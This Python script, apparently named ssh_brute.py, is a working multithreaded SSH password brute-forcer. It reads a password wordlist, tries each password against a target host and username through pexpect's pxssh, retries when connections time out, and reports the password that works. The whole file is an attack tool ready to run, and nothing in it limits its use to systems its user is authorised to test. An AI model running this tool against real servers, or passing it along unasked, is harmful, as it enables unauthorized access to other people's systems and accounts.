from argparse import ArgumentParser
from pexpect import pxssh
import time
import threading

max_connections = 5
connection_lock = threading.BoundedSemaphore(value=max_connections)

Found = False
Fails = 0

def connect(host, user, password, release=True):
    '''
    Attempt to start an SSH connection on a host with given username and password.

    host: str
        the host running the SSH server to connect to
    user: str
        the username to test
    password: str
        the password to test
    release: bool
        indicates whether semaphore should be released or not
    '''
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        # login() function succeeded with no exception
        print(f'[+] Password found: {password}')
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e): # SSH server is maxed out at the number of connections 
            Fails += 1
            # sleep for a few seconds before trying again with the same password
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e): # pxssh having trouble obtaining a command prompt
            # sleep for a second and try again
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        # since connect() can recursively call another connect(), only the caller should be able to release the semaphore
        if release:
            connection_lock.release()

def main():
    parser = ArgumentParser(usage='python3 ssh_brute.py TARGET_HOST -u USERNAME -f PASSWORD_FILE')
    parser.add_argument('target_host', type=str, metavar='TARGET_HOST', help="Specify target host's IP address")
    parser.add_argument('-u', required=True, type=str, metavar='USERNAME', help='Specify username')
    parser.add_argument('-f', required=True, type=str, metavar='PASSWORD_FILE', help='Specify file containing passwords')

    args = parser.parse_args()
    host = args.target_host
    user = args.u
    password_file = args.f

    with open(password_file) as file:
        for line in file.readlines():
            if Found:
                print('[*] Exiting: password found')
                exit(0)
            if Fails > 5:
                print("[!] Exiting: too many socket timeouts")
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print(f"[-] Testing: {password}")
            t = threading.Thread(target=connect, args=(host, user, password))
            t.start()

if __name__ == '__main__':
    main()